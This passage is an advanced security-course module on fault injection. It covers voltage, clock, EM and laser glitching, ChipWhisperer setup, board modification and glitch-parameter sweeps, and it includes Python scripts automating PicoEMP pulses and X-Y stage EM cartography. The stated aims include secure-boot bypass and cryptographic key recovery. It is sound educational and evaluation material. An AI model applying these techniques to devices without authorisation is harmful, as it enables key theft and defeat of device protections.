---
corso: "Cybersecurity Masterclass"
fase: "Domain 17 — Physical & Hardware Security"
modulo: "17.2"
titolo: "Fault Injection Techniques and Countermeasures"
versione: "ChipWhisperer-Husky FW 1.x, PicoEMP v2, Common Criteria AVA_VAN.5, FIPS 140-3 Level 4, EMVCo 2025"
livello: "Advanced"
prerequisiti:
  - "Domain 17.1 (physical security, side-channel analysis fundamentals — SPA/DPA/CPA)"
  - "Digital electronics (CMOS logic, flip-flops, setup/hold time, clock trees)"
  - "Understanding of AES, RSA-CRT, and ECC internals (Domain 13)"
  - "Embedded systems programming (ARM Cortex-M, C, register-level I/O)"
  - "Python scripting for hardware automation (serial, SPI, ChipWhisperer API)"
obiettivi:
  - "Configure ChipWhisperer-Husky for voltage glitching campaigns including target board preparation, shunt resistor installation, decoupling cap removal, and parameter sweep automation"
  - "Perform Differential Fault Analysis on AES-128 (Piret-Quisquater) and RSA-CRT (Bellcore) to recover cryptographic keys from faulty ciphertexts/signatures"
  - "Conduct electromagnetic fault injection using PicoEMP with X-Y stage positioning and EM cartography to map chip susceptibility regions"
  - "Bypass secure-boot implementations on STM32 (RDP), nRF52 (APPROTECT), and ESP32 targets using voltage and EM glitching"
  - "Evaluate and recommend fault-injection countermeasures: dual-rail logic, sensor-based detection, instruction redundancy, and infective computation"
tag: [fault-injection, voltage-glitching, emfi, laser-fi, chipwhisperer, picoEMP, dfa, bellcore, piret-quisquater, secure-boot-bypass, plundervolt, rowhammer, countermeasures]
---

# Domain 17, Chapter 17B — Fault Injection Techniques and Countermeasures

> **Learning Objectives.** After completing this module the student will be able to: (1) configure ChipWhisperer-Husky for voltage glitching campaigns on ARM Cortex-M targets including shunt resistor installation, decoupling capacitor removal, trigger setup, and automated parameter sweep with glitch-map visualization; (2) perform electromagnetic fault injection using PicoEMP with X-Y stage positioning, EM cartography scanning, and pulse-parameter optimization to map chip susceptibility regions; (3) execute Differential Fault Analysis to recover AES-128 keys via the Piret-Quisquater attack and RSA private keys via the Bellcore attack on CRT implementations; (4) bypass secure-boot and readout-protection mechanisms on real embedded targets (STM32 RDP, nRF52 APPROTECT, ESP32 secure boot, Tegra X1 fusee gelee) using calibrated voltage and EM glitches; (5) evaluate and select fault-injection countermeasures (dual-rail logic, voltage/clock/light sensors, instruction redundancy, infective computation, temporal/spatial redundancy) for a given Common Criteria or FIPS 140-3 assurance level.

> **Scope.** Voltage fault injection: VCC glitching theory (timing windows, glitch shape parameters, amplitude/width/offset), crowbar vs. capacitor-dump topologies, MOSFET switching, ChipWhisperer-Husky hardware setup, target board preparation (shunt resistor, decoupling cap removal), glitch parameter search methodology (width sweep, offset sweep, repeat), glitch characterization taxonomy (instruction skip, data corruption, control-flow hijack, register corruption), voltage regulator bypass, multi-rail glitching. Clock fault injection: clock multiplexer circuits, PLL manipulation, FPGA-based clock glitcher design, overclocking attacks, setup/hold time violation exploitation, clock vs. voltage glitch tradeoffs. Electromagnetic fault injection (EMFI): near-field EM pulse physics (Faraday induction, eddy currents), coil design (diameter, turns, core, resonant frequency), PicoEMP internals (capacitor bank, SCR/IGBT switching, pulse shaping), probe positioning (X-Y-Z stage, EM cartography), spatial resolution vs. coil diameter, packaged vs. decapsulated targets, ChipSHOUTER-PicoEMP comparison. Laser fault injection (LFI): photocurrent generation (electron-hole pairs, p-n junction perturbation), wavelength selection (1064 nm backside, 532/405 nm frontside), spatial precision (<1 µm), single-bit vs. multi-bit faults, pulse energy, multi-spot setups (DOE), equipment (Riscure Inspector FI, Hamamatsu, custom fiber-coupled builds), cost analysis, backside preparation (silicon thinning <100 µm). Optical fault injection: white-light smartcard attacks, phototransistor sensitivity, SRAM perturbation. Body biasing injection (BBI): substrate voltage manipulation, local vs. global biasing, probe design, BBI vs. EMFI comparison. Differential Fault Analysis (DFA): Piret-Quisquater on AES (round-8 fault, key-byte search-space reduction from 2^128 to 2^8), Bellcore attack on RSA-CRT (faulty signature GCD recovery of p), DFA on ECC (sign-fault attacks), Ineffective Fault Analysis (IFA), Fault Sensitivity Analysis (FSA), Safe-Error Analysis (SEA). Secure-boot fault-injection case studies: Nintendo Switch Tegra X1 (CVE-2018-6242/fusée gelée), STM32 RDP bypass methodology, ESP32 secure-boot bypass, nRF52 APPROTECT bypass, Raspberry Pi secure-boot considerations, TOCTOU faults on eMMC (interposer design, timing). Countermeasures: dual-rail logic (WDDL, SABL), sensor-based detection (voltage/clock/temperature/light monitors, BOR/POR), active shields (metal mesh), randomized/jittered clock, instruction redundancy, algorithmic countermeasures (infective computation, fault detection codes), temporal redundancy, spatial redundancy, software CFI for embedded, random delays and dummy operations, combined hardware+software defense-in-depth, certification standards (Common Criteria attack potential, FIPS 140-3 physical security levels, EMVCo). Tooling ecosystem: ChipWhisperer-Husky/Pro/Nano, PicoEMP build, Riscure Inspector, ChipSHOUTER, GIAnT, custom FPGA platforms, open-source glitching frameworks.
>
> **Audience.** Hardware security evaluators performing physical attacks on embedded devices, detection engineers characterizing hardware-attack surfaces, architects selecting countermeasures for secure elements and boot chains, and incident responders assessing the feasibility of physical compromise.
>
> **Prerequisites.** Domain 17, Chapter 17A (side-channel analysis fundamentals — SPA/DPA/CPA, EM probes, template attacks). Domain 12 (reverse engineering for target characterization). Domain 13 (cryptographic algorithms targeted by DFA). Domain 7B (Rowhammer, Plundervolt, hardware-level vulnerabilities). Domain 4B (CET/PAC as potential targets of FI-based bypass).

---

## 1. Voltage fault injection

### 1.1 Theory of VCC glitching

Every digital circuit has a minimum supply voltage (V_min) below which logic gates no longer switch reliably. When the supply voltage drops below V_min for a brief window — typically a few nanoseconds — some gates compute correct results while others latch incorrect values. The result is a targeted computational error: one instruction may produce the wrong output, a conditional branch may take the wrong path, or a register may capture corrupted data.

The timing window must be precise. If the glitch is too wide, the processor resets (brownout). If the glitch is too narrow, the voltage recovers before any gates are affected. If the glitch occurs at the wrong clock cycle, it corrupts an irrelevant operation. Successful voltage fault injection requires controlling three parameters simultaneously: the glitch **width** (duration of the voltage drop, typically 5–100 ns for modern microcontrollers), the glitch **offset** (delay from a triggering event — a known instruction boundary, a GPIO toggle, or a protocol event — to the start of the glitch), and the glitch **amplitude** (how far below the nominal voltage the supply drops, or equivalently, how much current the crowbar circuit sinks).

The relationship between these parameters and fault behavior is non-linear and target-specific. A given (width, offset, amplitude) tuple may produce no effect on one device, an instruction skip on another (same model, different manufacturing batch), and a full reset on a third. This is because manufacturing process variation causes each individual die to have slightly different V_min thresholds. Characterizing a target therefore requires systematic parameter sweeps.

### 1.2 Crowbar vs. capacitor-dump topologies

The two dominant circuit topologies for voltage glitching are the **crowbar** and the **capacitor dump**.

In the crowbar topology, a fast-switching MOSFET (typically an N-channel power MOSFET with low R_DS(on) and fast gate-charge characteristics, such as the IRLML6344 or equivalent) is connected between the target's VCC rail and ground. When the MOSFET is turned on for a brief pulse, it shorts VCC to ground through the MOSFET's drain-source resistance, causing a rapid voltage drop on the target's supply. The glitch width is controlled by the gate-drive pulse duration. The glitch amplitude depends on the MOSFET's R_DS(on), the impedance of the power supply, and the decoupling capacitance remaining on the target board.

The crowbar produces a negative-going voltage spike: VCC drops toward ground. The depth of the drop is limited by the MOSFET's on-resistance and the power supply's regulation loop (which tries to maintain voltage but cannot respond in nanoseconds). Typical crowbar glitches reduce VCC by 20–80% of nominal for 5–50 ns.

In the capacitor-dump topology, a pre-charged capacitor is connected to the target's VCC via a fast switch. The capacitor can be charged to a voltage higher than VCC (producing a positive-going spike, which violates setup times by clocking gates too fast) or lower than VCC (producing a negative-going drop similar to the crowbar). The capacitor value determines the energy delivered; the switch speed determines the rise/fall time.

Crowbar circuits are simpler and are the standard approach in ChipWhisperer hardware. Capacitor-dump circuits offer more control over the glitch waveform shape but are more complex to design and tune. For most microcontroller targets, the crowbar is sufficient.

### 1.3 MOSFET switching characteristics

The switching speed of the glitch MOSFET limits the minimum glitch width and the rise/fall time of the voltage perturbation. Key parameters from the MOSFET datasheet:

**Turn-on delay (t_d(on))**: the time from the gate-drive pulse rising edge to the drain current beginning to flow. Typically 2–10 ns for suitable MOSFETs.

**Rise time (t_r)**: the time for the drain current to go from 10% to 90% of its final value. Typically 2–5 ns.

**Turn-off delay (t_d(off))**: the time from the gate-drive pulse falling edge to the drain current beginning to decrease. Often longer than t_d(on).

**Fall time (t_f)**: the time for drain current to drop from 90% to 10%. Typically 2–5 ns.

The total minimum glitch width is approximately t_d(on) + t_r + t_d(off) + t_f, which for fast MOSFETs is around 10–20 ns. Achieving sub-10-ns glitches requires careful gate-drive design (low-impedance gate driver, short PCB traces, bypass capacitors on the gate driver's supply).

For the ChipWhisperer platform, the glitch MOSFET is integrated into the capture board, with the gate driven by an FPGA output through a dedicated gate driver IC. The FPGA controls the pulse width with sub-nanosecond resolution (using the FPGA's internal clock multiplier and fine-delay elements).

### 1.4 ChipWhisperer-Husky voltage glitching setup

The ChipWhisperer-Husky is NewAE Technology's current-generation capture and glitch platform. Its architecture for voltage glitching:

**Clock and trigger subsystem**: the Husky generates a clock for the target (or uses the target's own clock, captured via an input) and provides trigger functionality — an external trigger input (GPIO), a pattern-match trigger (looking for a specific byte sequence on a UART or SPI bus), or an ADC-level trigger (triggering when the power trace crosses a threshold). The trigger fires the glitch at a programmable offset (in clock cycles + fine delay) from the trigger event.

**Glitch output**: the Husky has two glitch MOSFETs — one high-power (for crowbar glitching of 3.3V/5V targets) and one low-power (for 1.8V/1.2V targets). The Python API allows setting:
- `scope.glitch.width`: pulse width as a percentage of the clock period (e.g., 40% of a 100 ns period = 40 ns glitch).
- `scope.glitch.offset`: fine delay within a clock period (for sub-cycle positioning).
- `scope.glitch.ext_offset`: coarse delay in clock cycles from the trigger.
- `scope.glitch.repeat`: number of consecutive glitch pulses (for multi-pulse attacks).
- `scope.glitch.output`: "enable_only" (crowbar to ground) or other modes.

**ADC capture**: simultaneously with glitching, the Husky captures the target's power trace via a 12-bit ADC at up to 200 MS/s. This allows correlating the glitch timing with the target's power consumption, confirming that the glitch is hitting the intended operation.

**Target board**: NewAE provides target boards (CW308 UFO board with interchangeable target modules — STM32F3, STM32F4, XMEGA, SAM4S, etc.) with pre-installed shunt resistors and easily-removable decoupling capacitors. For custom targets, the analyst must modify the target board.

### 1.5 Target board preparation

Preparing a custom target board for voltage glitching involves two essential modifications:

**Shunt resistor installation.** A low-value resistor (typically 1–10 Ω) is inserted in series with the target's VCC supply. The voltage across this resistor is proportional to the supply current, providing the power-measurement signal for the ADC capture. On the CW308 target boards, the shunt resistor is pre-installed. On custom boards, the analyst cuts the VCC trace and solders the shunt resistor across the cut, with the measurement leads connected to the ChipWhisperer's ADC input.

**Decoupling capacitor removal.** Decoupling capacitors (typically 100 nF ceramic and 10 µF bulk) are placed close to the target IC to stabilize VCC. These capacitors absorb voltage transients — exactly the transients the glitcher is trying to inject. Removing decoupling capacitors (or reducing their total capacitance by removing all but one) makes the target more susceptible to voltage glitches. The analyst must balance glitch susceptibility against stability: removing too many capacitors may cause the target to malfunction even without glitching (due to normal switching noise).

The procedure is iterative: remove capacitors one at a time, test the target's normal operation, and verify that the glitch amplitude is sufficient to cause faults. Some targets have internal decoupling (on-die capacitance) that cannot be removed, limiting the achievable glitch depth.

### 1.6 Glitch parameter search methodology

Finding a successful glitch is fundamentally a search problem in a three-dimensional parameter space (width, offset, amplitude). The standard approach is a systematic sweep:

**Step 1: Coarse offset sweep.** Fix the width and amplitude to moderate values (e.g., 40% width, 50% amplitude) and sweep the offset over the entire window of interest (e.g., from the trigger event to 10,000 clock cycles after). At each offset, observe the target's behavior: normal result, corrupted result (success!), crash/reset, or hang. This identifies the approximate clock cycle where the target operation of interest occurs.

**Step 2: Fine offset + width sweep.** Narrow the offset range to the region identified in Step 1 (±100 clock cycles). Sweep both offset and width simultaneously (e.g., width from 10% to 80%, offset in single-cycle increments). Record the target's response for each parameter tuple.

**Step 3: Amplitude tuning.** For the (offset, width) tuples that produced results (either success or crashes), adjust the amplitude to maximize the success rate while minimizing the crash/reset rate. The ideal operating point is the amplitude where the target consistently produces the desired fault (e.g., instruction skip) without resetting.

The search is automated via Python scripts in the ChipWhisperer framework. A typical search might involve 10,000–100,000 parameter tuples, with each attempt taking 10–100 ms (dominated by the target's boot/recovery time), resulting in a search time of minutes to hours.

**Glitch maps**: the results are plotted as a 2D heatmap (width vs. offset) with color-coded outcomes (green = success, red = crash, gray = no effect). These glitch maps reveal the "sweet spots" where the target is vulnerable and are characteristic of the target's microarchitecture.

### 1.7 Glitch characterization taxonomy

Voltage glitches produce four categories of faults, each with different exploitation value:

**Instruction skip.** The most valuable fault for secure-boot bypass: an entire instruction is skipped as if it were a NOP. If the skipped instruction is a conditional branch (e.g., `BNE fail` after a signature comparison), the branch is not taken and execution falls through to the success path. Instruction skips occur when the voltage drop causes the instruction decoder to latch an incorrect opcode or when the program counter is incremented past an instruction without executing it.

**Data corruption.** A register or memory location is corrupted — the stored value differs from the correct value. If the corrupted value is a cryptographic intermediate (e.g., an AES state byte after round 8), this enables Differential Fault Analysis (§7). If the corrupted value is a comparison result, it may invert the comparison outcome. Data corruption is the most common fault type and is the basis for DFA attacks.

**Control-flow hijack.** The program counter itself is corrupted, causing execution to jump to an unexpected address. This is less predictable than instruction skip but can be exploited if the target address happens to be useful (e.g., a return-to-boot-shell address, or a function that disables security features).

**Register corruption.** A CPU register's value is altered without changing the instruction stream. If the corrupted register is a loop counter, the loop may terminate early or run extra iterations. If the corrupted register is a function argument, the function operates on incorrect data.

### 1.8 Voltage regulator bypass and multi-rail glitching

Many modern SoCs use integrated voltage regulators that generate the core voltage (e.g., 1.1V core from a 3.3V I/O supply). Glitching the external supply (3.3V) may not affect the core logic if the internal regulator has sufficient decoupling and regulation bandwidth to absorb the transient.

Bypass strategies: (1) glitch the regulator's output directly (requires probing the output cap or a via on the internal power plane — sometimes accessible on the PCB's bottom side), (2) glitch the regulator's input with sufficient amplitude and width that the regulator cannot compensate (overwhelm the regulation loop's bandwidth — the regulator's control loop operates at 1–10 MHz, so glitches faster than the loop bandwidth pass through), (3) target the I/O voltage rail instead (I/O pads often run at the external supply voltage, and glitching I/O operations can cause incorrect data to be latched from external memory or communication buses).

Multi-rail glitching targets multiple voltage rails simultaneously (e.g., core + I/O, or core + SRAM). This requires multiple glitch MOSFETs with independent timing, which some advanced platforms (ChipWhisperer-Pro with expansion board) support. Multi-rail glitching can produce faults that single-rail glitching cannot, particularly on SoCs with separate power domains for security-critical logic.

---

## 2. Clock fault injection

### 2.1 Clock multiplexer circuits

A clock glitch is an extra or missing clock edge inserted into the target's clock signal. The simplest implementation is a multiplexer (MUX) that switches between the normal clock and a glitched clock (the normal clock phase-shifted or a separately generated fast clock) for one or a few cycles. The MUX is controlled by the glitch FPGA, which asserts the select line for the duration of the glitch.

The glitched clock can be: (1) the normal clock with an extra rising edge inserted (effectively doubling the frequency for one cycle), (2) a completely different frequency clock (e.g., 4× the normal frequency) that is switched in for one or a few cycles, or (3) the normal clock with a short additional pulse appended (a runt pulse that may or may not be recognized as a full clock edge, depending on the target's clock input threshold).

Clock glitching requires that the analyst supply the target's clock externally (the ChipWhisperer's clock output drives the target, rather than the target using an internal oscillator). Many targets can be configured to use an external clock (via a pin configuration or by replacing the crystal oscillator with the ChipWhisperer's clock output). Targets with fixed internal oscillators (e.g., some ARM Cortex-M with internal RC oscillators that cannot be disabled) are not susceptible to external clock glitching, though they may still be susceptible to voltage or EM glitching.

### 2.2 Setup and hold time violation

Digital flip-flops have minimum setup time (data must be stable before the clock edge) and hold time (data must remain stable after the clock edge) requirements. A clock glitch that shortens the clock period below the critical path's propagation delay causes the combinational logic between flip-flops to not settle before the next clock edge. The flip-flop samples a transitioning signal, producing a metastable state that resolves to either the correct or incorrect value.

This is the fundamental mechanism by which clock glitching induces faults: the short clock period forces timing violations in the critical path, and the resulting metastability resolves to incorrect values with a probability that depends on the margin between the critical-path delay and the glitched clock period.

The critical path is the longest combinational logic path between any two flip-flops in the design. In a typical microcontroller, the critical path runs through the ALU or the memory interface. Clock glitches affect operations on the critical path more readily than operations on shorter paths, introducing a degree of selectivity.

### 2.3 FPGA-based clock glitcher design

A typical FPGA-based clock glitcher (implemented in the ChipWhisperer FPGA or a standalone FPGA board) consists of:

**Phase-shifted clock generation**: the FPGA's PLL (Phase-Locked Loop) generates multiple phase-shifted versions of the input clock (e.g., 0°, 90°, 180°, 270°). By MUX-selecting between these phases at specific moments, the FPGA can insert an extra clock edge (switching from 0° to 180° and back within one cycle, creating two rising edges where there should be one).

**Glitch timing logic**: a counter that counts clock cycles from the trigger event. When the counter reaches the programmed offset, the glitch logic activates for the programmed width (in clock cycles or fractional cycles using the phase-shifted clocks).

**Output stage**: a fast buffer that drives the target's clock input. The buffer must have low skew and fast rise/fall times to deliver the glitch edges cleanly.

ChipWhisperer implements this in a Xilinx Spartan-6 (CW-Lite) or Spartan-7 (CW-Husky) FPGA. The PLL generates 4 phase-shifted clocks (0°, 90°, 180°, 270°), and the glitch output is formed by multiplexing between these phases based on the glitch parameters. This approach provides effective sub-nanosecond edge-placement control within each clock period.

### 2.4 Clock glitch vs. voltage glitch tradeoffs

Clock glitching has several advantages over voltage glitching: it does not require modifying the target board (no shunt resistor, no decoupling cap removal — just an external clock connection), it produces cleaner faults (a precise timing violation rather than a broad voltage disturbance), and it does not risk damaging the target (no risk of ESD or over-voltage from a crowbar circuit).

The disadvantages: clock glitching requires the target to accept an external clock (not all targets do), it requires the analyst to know the target's clock frequency and PLL configuration (to generate a compatible clock), and it may not affect targets with very short critical paths (the clock period must be shortened enough to violate the critical path, which may require extremely narrow glitches on fast processors).

In practice, voltage glitching is more universally applicable (it works regardless of clock source) and is the default choice. Clock glitching is preferred when the target is amenable and when precise, repeatable faults are needed (e.g., for DFA, where the fault must affect a specific byte of a specific AES round).

### 2.5 PLL manipulation and overclocking attacks

Beyond clock multiplexer glitching, some processors expose their PLL configuration registers over debug or software interfaces. If the attacker has partial code execution (e.g., through a prior vulnerability), they can reprogram the PLL to a frequency that exceeds the processor's rated maximum, causing systematic timing violations across the entire design. Unlike external clock glitching, PLL manipulation does not require physical clock injection — it abuses the processor's own clock management hardware.

On ARM Cortex-M devices, the RCC (Reset and Clock Control) registers configure the PLL multiplier and divider. An STM32F4 rated at 168 MHz can be overclocked to 240+ MHz by modifying the PLL configuration registers, inducing widespread timing violations. The resulting faults are less controlled than targeted clock glitching (the entire chip is affected rather than specific operations), but PLL manipulation is accessible from software and does not require physical equipment.

On x86 platforms, the equivalent is software-based frequency manipulation via MSR registers. The Plundervolt attack (Domain 7B §1.3) demonstrated that Intel's voltage-scaling MSR can be abused to induce faults in SGX enclaves — the same class of attack applied to clock frequency rather than voltage would constitute a PLL-based fault injection from software. Recent Intel processors restrict MSR access to signed firmware to prevent this attack vector, but older platforms remain vulnerable.

A related technique is clock stretching: instead of inserting extra edges, the attacker extends a single clock period (by momentarily switching to a slower clock). This causes the processor to hold its state longer than expected, allowing metastable signals to resolve (potentially to incorrect values) and creating timing windows where voltage glitches are more effective. Clock stretching combined with voltage glitching can achieve successful faults at lower glitch amplitudes than either technique alone, reducing the risk of crash or reset.

---

## 3. Electromagnetic fault injection (EMFI)

### 3.1 Near-field EM pulse physics

EMFI exploits Faraday's law of electromagnetic induction: a time-varying magnetic field induces an electromotive force (EMF) in nearby conductors. A high-current pulse through a small coil placed near the target chip generates a rapidly-changing magnetic field. This field induces transient currents (eddy currents) in the chip's power distribution network and signal traces, causing localized voltage perturbations that produce computational faults.

The induced EMF is proportional to the rate of change of the magnetic flux (dΦ/dt), which depends on: (1) the peak current in the coil, (2) the rise time of the current pulse (faster rise → higher dΦ/dt → stronger induced EMF), (3) the coil's proximity to the target (magnetic field strength falls off as 1/r³ for a small coil, approximating a magnetic dipole), and (4) the mutual inductance between the coil and the target's conductors (depends on geometry, alignment, and the target's metallization layout).

The key distinction from voltage glitching: EMFI is a **local** perturbation. The induced currents affect a region of the chip comparable in size to the coil diameter. A small coil (1–2 mm diameter) can target a specific functional block (the ALU, the flash interface, the crypto engine) without affecting other parts of the chip. This spatial selectivity is the primary advantage of EMFI over voltage glitching (which affects the entire chip's power supply uniformly).

### 3.2 Coil design parameters

The EMFI coil is the critical component that determines fault injection effectiveness and spatial resolution.

**Diameter**: smaller coils provide higher spatial resolution (the magnetic field is concentrated in a smaller area) but deliver less total energy (lower magnetic flux per unit area in the target). Typical EMFI coils range from 0.5 mm (high resolution, used on decapsulated chips) to 5 mm (lower resolution, used on packaged chips where the die is several mm below the package surface). For most microcontroller targets in QFP or QFN packages, 1–3 mm diameter coils work well.

**Number of turns**: more turns increase the magnetic field strength (for a given current) but also increase the coil's inductance, which slows the current rise time and reduces dΦ/dt. For EMFI, single-turn or few-turn coils are preferred because the fast rise time (high dΦ/dt) is more important than the peak field strength.

**Core material**: air-core coils are simplest and have no frequency limitations. Ferrite-core coils concentrate the magnetic flux and increase the coupling to the target, but the ferrite's permeability limits the pulse bandwidth (ferrite saturates or has frequency-dependent losses). For fast EMFI pulses (ns-scale rise times), air-core coils are standard. For slower pulses (µs-scale), ferrite cores can be beneficial.

**Resonant frequency**: the coil's self-resonant frequency (determined by its inductance and parasitic capacitance) must be higher than the pulse bandwidth. Operating near or above the self-resonant frequency causes the coil to behave as a capacitor rather than an inductor, reducing its effectiveness.

### 3.3 PicoEMP design details

The PicoEMP (developed by Colin O'Flynn / NewAE Technology) is an open-source, low-cost EMFI tool designed for research and education. Its architecture:

**Energy storage**: a capacitor bank (typically 10–100 nF, charged to 200–300V) stores the pulse energy. Higher capacitance and voltage deliver more energy (E = ½CV²) and produce stronger faults, but also increase the risk of damaging the target.

**Switching element**: a thyristor (SCR — Silicon Controlled Rectifier) or IGBT (Insulated Gate Bipolar Transistor) rapidly discharges the capacitor through the coil. The SCR's advantage is extreme speed (turn-on time < 100 ns) and simplicity (once triggered, it latches on until the current drops below the holding current). The IGBT's advantage is controllability (it can be turned off by removing the gate voltage, allowing precise pulse-width control).

**Pulse shaping**: the RLC (resistor-inductor-capacitor) circuit formed by the capacitor, the switching element, and the coil determines the pulse shape. The first half-cycle of the RLC oscillation provides a fast-rising current pulse through the coil. A series diode can clamp the ringing (preventing the second half-cycle from propagating), producing a unipolar pulse.

**Trigger interface**: the PicoEMP accepts an external trigger (from a ChipWhisperer, oscilloscope, or logic analyzer) to synchronize the pulse with the target's execution. The trigger-to-pulse jitter (the uncertainty in the delay from trigger to pulse emission) determines the temporal precision of the fault injection. For the PicoEMP, jitter is typically 10–50 ns, which is acceptable for targeting specific operations on a microcontroller running at 8–48 MHz.

### 3.4 Probe positioning and EM cartography

Finding the right position and orientation for the EMFI probe is critical. The process:

**X-Y-Z stage**: the probe is mounted on a motorized or manual X-Y-Z stage that allows precise positioning over the target chip. For packaged chips, the probe is positioned above the package surface (Z distance = package thickness + air gap, typically 0.5–2 mm). For decapsulated chips, the probe can be brought within 100 µm of the die surface.

**EM cartography**: the analyst systematically scans the probe across the chip surface, injecting a pulse at each position and recording the target's response (correct result, faulty result, crash, hang). The results are plotted as a 2D heatmap overlaid on an image of the chip package. This map reveals "hot spots" — positions where fault injection is most effective — which typically correspond to the location of the security-critical logic on the die.

EM cartography is time-consuming (a 10×10 mm chip scanned at 0.5 mm resolution requires 400 positions, each requiring multiple pulse repetitions for statistical significance). Automated scanning with motorized stages and scripted capture reduces the effort but still requires hours to days for a thorough scan.

### 3.5 EMFI vs. voltage glitching comparison

EMFI and voltage glitching produce similar fault types (instruction skips, data corruption, control-flow hijacks) but differ in their spatial characteristics, board preparation requirements, and cost.

EMFI advantages: no board modification required (non-contact), spatial selectivity (target specific chip regions), works on multi-chip boards (affects only the chip under the probe, leaving other chips unperturbed), effective through plastic packaging (no decapsulation needed for many targets).

EMFI disadvantages: higher equipment cost (PicoEMP ~$50–200 DIY, ChipSHOUTER ~$500–1000), lower temporal precision (jitter typically 10–50 ns vs. sub-ns for clock-synchronized voltage glitching), sensitivity to probe positioning (small changes in X-Y-Z position change the fault behavior dramatically), less reproducible between experiments (position and coupling vary).

Voltage glitching advantages: higher reproducibility (once the parameters are found, the fault is consistent), lower cost (a single MOSFET and driver), better temporal precision (directly synchronized to the target's clock), simpler setup for single-chip targets.

Voltage glitching disadvantages: requires board modification (shunt resistor, decoupling cap removal), affects the entire chip (cannot target specific logic blocks), may damage the target if the crowbar circuit is not properly current-limited.

In practice, the analyst typically starts with voltage glitching (cheaper, faster to set up) and moves to EMFI if voltage glitching fails (target has internal regulation, non-removable decoupling) or if spatial selectivity is needed.

### 3.6 EMFI automation scripts

Automated EMFI campaigns require control of the pulse generator (PicoEMP or ChipSHOUTER), an X-Y positioning stage, and the target. The following scripts demonstrate each component and tie them together for a full EM cartography scan.

**PicoEMP serial control.** The PicoEMP exposes a text-based serial (UART) interface. The wrapper below provides the essential operations: arm (charge capacitor), fire (discharge pulse), set voltage, and disarm.

```python
import serial, time

class PicoEMP:
    def __init__(self, port="/dev/ttyACM0", baud=115200):
        self.ser = serial.Serial(port, baud, timeout=1)
        time.sleep(0.5); self.ser.reset_input_buffer()

    def _cmd(self, c): self.ser.write(f"{c}\r\n".encode()); time.sleep(0.05)
    def arm(self):           self._cmd("arm")
    def fire(self):          self._cmd("pulse")
    def disarm(self):        self._cmd("disarm")
    def set_voltage(self, v): assert 50 <= v <= 300; self._cmd(f"voltage {v}")
    def close(self):         self.disarm(); self.ser.close()
```

**X-Y stage control.** A G-code stage (GRBL-based CNC or 3D-printer frame) is controlled via serial. The `XYStage` class homes on init, moves to absolute coordinates, and polls GRBL's `?` status query until the stage reports idle — ensuring the probe has settled before the pulse fires.

```python
class XYStage:
    def __init__(self, port, baud=115200):
        self.ser = serial.Serial(port, baud, timeout=2)
        time.sleep(2); self._g("$H"); self._g("G90")

    def _g(self, cmd):
        self.ser.write(f"{cmd}\n".encode())
        return self.ser.readline().decode().strip()

    def move_to(self, x_mm, y_mm, feed=500):
        self._g(f"G1 X{x_mm:.3f} Y{y_mm:.3f} F{feed}")
        while True:
            self.ser.write(b"?")
            if "Idle" in self.ser.readline().decode(): break
            time.sleep(0.05)
```

**Full EM cartography scan.** The scan iterates over an X-Y grid, fires a pulse at each position (with configurable repeats for statistical significance), classifies each outcome, and saves a JSON map keyed by `"x,y"` coordinates. The visualization function loads this JSON and renders a matplotlib `imshow` heatmap with success rate per position, using the `"hot"` colormap.

```python
import numpy as np, json
from datetime import datetime, timezone

def em_cartography(emp, stage, scope, target, x_range, y_range,
                   voltage=250, repeats=5, out="em_map.json"):
    emp.set_voltage(voltage)
    data = {}
    for x in np.arange(*x_range):
        for y in np.arange(*y_range):
            stage.move_to(x, y)
            outcomes = {"normal":0,"success":0,"reset":0,"crash":0,"mute":0}
            for _ in range(repeats):
                reset_target(); scope.arm()
                target.simpleserial_write("p", bytearray(16))
                emp.arm(); emp.fire(); scope.capture()
                outcomes[classify_response(target)] += 1
            data[f"{x:.2f},{y:.2f}"] = outcomes
    with open(out, "w") as f:
        json.dump({"timestamp": datetime.now(timezone.utc).isoformat(),
                    "voltage": voltage, "data": data}, f, indent=2)
    return data
```

The susceptibility map overlaid on a chip package photograph (or X-ray image) directly identifies which die regions are vulnerable to EMFI. The analyst then focuses on the highest-susceptibility position and performs a fine-grained timing sweep (ext_offset scan) at that fixed position to find the exact clock cycle for exploitation.

---

## 4. Laser fault injection (LFI)

### 4.1 Photocurrent generation in silicon

When photons with energy greater than the silicon bandgap (1.12 eV at room temperature, corresponding to wavelengths shorter than ~1100 nm) are absorbed in silicon, they generate electron-hole pairs. In the vicinity of a p-n junction (a transistor), these additional carriers alter the junction's depletion region and change the voltage across the transistor. If the generated photocurrent is large enough, it can flip the state of a logic gate or corrupt the value stored in an SRAM cell.

**Backside injection** uses infrared light (typically 1064 nm from an Nd:YAG laser): silicon is partially transparent at 1064 nm (absorption length ~500 µm), so the laser beam passes through the silicon substrate and reaches the active transistor layers on the other side. Backside injection requires thinning the silicon substrate to reduce absorption (typically to 50–100 µm) and polishing the surface to optical quality.

**Frontside injection** uses visible or near-IR light (532 nm green, 405 nm violet): silicon is opaque at these wavelengths, so the light is absorbed in the first few micrometers of the surface. Frontside injection targets the metal layers and upper transistor structures directly but is blocked by metallization layers — the analyst can only inject faults through gaps in the metal fill. Frontside injection requires die decapsulation (removing the package to expose the die surface) and is less practical for modern chips with many metal layers (7–15 layers in 28nm and below nodes, providing almost complete coverage of the die surface).

### 4.2 Spatial precision and single-bit faults

LFI provides the highest spatial precision of any fault injection technique. Using a microscope objective with high numerical aperture (NA > 0.5), the laser beam can be focused to a spot size of λ / (2 × NA) — approximately 1 µm for 1064 nm light with NA = 0.5. This spot size is smaller than an individual SRAM cell in many process nodes (an SRAM cell is typically 0.5–5 µm² depending on the node), enabling single-bit fault injection.

Single-bit faults are extraordinarily valuable for DFA: they produce the minimum perturbation, which maximizes the information extracted per fault. A single-byte fault in AES round 8 reduces the key search space to 2^8 candidates per key byte (Piret-Quisquater, §7.1). A single-bit fault reduces it further, and multiple single-bit faults in different positions can recover the entire key with mathematical certainty.

Multi-bit faults occur when the laser spot covers multiple transistors or when the photocurrent spreads beyond the spot size due to carrier diffusion. The fault multiplicity increases with laser power (more carriers generated) and spot size (more transistors illuminated).

### 4.3 Pulse duration and energy requirements

The laser pulse must be short enough to affect only the targeted clock cycle (otherwise it corrupts multiple cycles) and energetic enough to generate sufficient photocurrent. Typical parameters:

**Pulse duration**: 1–100 ns. Shorter pulses provide better temporal resolution but require higher peak power to deliver sufficient energy. Longer pulses may affect multiple clock cycles if the target runs at high frequency.

